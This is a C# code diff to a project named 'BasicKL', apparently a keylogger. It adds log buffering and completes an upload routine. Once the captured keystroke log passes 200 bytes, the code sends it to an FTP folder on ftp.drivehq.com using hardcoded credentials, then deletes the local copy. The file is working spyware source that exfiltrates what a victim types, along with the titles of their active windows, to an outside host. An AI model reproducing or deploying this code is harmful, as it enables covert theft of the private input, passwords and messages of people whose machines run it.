@@ -27,15 +27,35 @@ namespace BasicKL
 
         private string activeWndTitle;
         private Guid guid;
+        private Queue<string> messageBuffer;
+        private bool uploading;
 
         public Logger(Guid guid)
         {
             this.guid = guid;
+            this.messageBuffer = new Queue<string>();
+            this.uploading = false;
             
-            log.Info(String.Format("\n{0:d/M/yyyy HH:mm:ss}", DateTime.Now) + " - " + guid.ToString());
-            log.Info("\nStarting in "+GetLogPath());
+            BufferedLog(String.Format("\n{0:d/M/yyyy HH:mm:ss}", DateTime.Now) + " - " + guid.ToString());
+            BufferedLog("\nStarting in "+GetLogPath());
             activeWndTitle = GetActiveWindowTitle();
-            log.Info(String.Format("\n\n===\n{0}\n===\n", activeWndTitle));
+            BufferedLog(String.Format("\n\n===\n{0}\n===\n", activeWndTitle));
+        }
+
+        private void BufferedLog(string msg)
+        {
+            if (uploading)
+            {
+                messageBuffer.Enqueue(msg);
+            }
+            else
+            {
+                while (messageBuffer.Count > 0)
+                {
+                    log.Info(messageBuffer.Dequeue());
+                }
+                log.Info(msg);
+            }
         }
 
         public void Log(string msg)
@@ -43,27 +63,34 @@ namespace BasicKL
             string curWndTitle = GetActiveWindowTitle();
             if (curWndTitle != activeWndTitle)
             {
-                log.Info(String.Format("\n\n===\n{0}\n===\n", curWndTitle));
+                BufferedLog(String.Format("\n\n===\n{0}\n===\n", curWndTitle));
                 activeWndTitle = curWndTitle;
             }
 
-            log.Info(msg);
+            BufferedLog(msg);
 
-            int maxSizeMb;
-            if (!Int32.TryParse(ConfigurationManager.AppSettings["maxLogSizeMb"], out maxSizeMb))
-                maxSizeMb = 1;
-
-            long maxSizeB = (long)(maxSizeMb) << 20;
-
-            FileInfo logInfo = new FileInfo(GetLogPath());
-            if (logInfo.Length >= maxSizeB)
+            // If the log is sufficiently large, upload it to remote and clear the log
+            if (!uploading)
             {
-                UploadMe();
+                int maxSizeMb;
+                if (!Int32.TryParse(ConfigurationManager.AppSettings["maxLogSizeMb"], out maxSizeMb))
+                    maxSizeMb = 1;
+
+                long maxSizeB = (long)(maxSizeMb) << 20;
+
+                FileInfo logInfo = new FileInfo(GetLogPath());
+                if (logInfo.Length >= 200)
+                {
+                    UploadMe();
+                }
             }
+            
         }
 
         private async void UploadMe()
         {
+            uploading = true;
+
             FtpWebRequest req = (FtpWebRequest)WebRequest.Create("ftp://ftp.drivehq.com/"+guid.ToString());
             req.Credentials = new NetworkCredential("msd7734", "compsec");
             req.Method = WebRequestMethods.Ftp.MakeDirectory;
@@ -71,15 +98,26 @@ namespace BasicKL
             response.Close();
 
             byte[] b = File.ReadAllBytes(GetLogPath());
-            string fname = String.Format("\n{0:d/M/yyyy HH:mm:ss}", DateTime.Now);
+            string fname = String.Format("\n{0:d-M-yyyy}", DateTime.Now);
 
             FtpWebRequest req2 = (FtpWebRequest)WebRequest.Create(
                 String.Format("ftp://ftp.drivehq.com/{0}/{1}.txt", guid.ToString(), fname)
             );
             req2.Credentials = new NetworkCredential("msd7734", "compsec");
             req2.Method = WebRequestMethods.Ftp.AppendFile;
+            req2.ContentLength = b.Length;
+            using (Stream reqStream = await req2.GetRequestStreamAsync())
+            {
+                await reqStream.WriteAsync(b, 0, b.Length);
+            }
+            
             FtpWebResponse response2 = (FtpWebResponse)await req2.GetResponseAsync();
             response2.Close();
+
+            File.Delete(GetLogPath());
+            log.Info("");
+
+            uploading = false;
         }
 
         public string GetLogPath()
@@ -90,7 +128,9 @@ namespace BasicKL
                 .FirstOrDefault();
 
             //force create file first
-            log.Info("");
+            if (!uploading)
+                log.Info("");
+
             return root.File;
         }
 
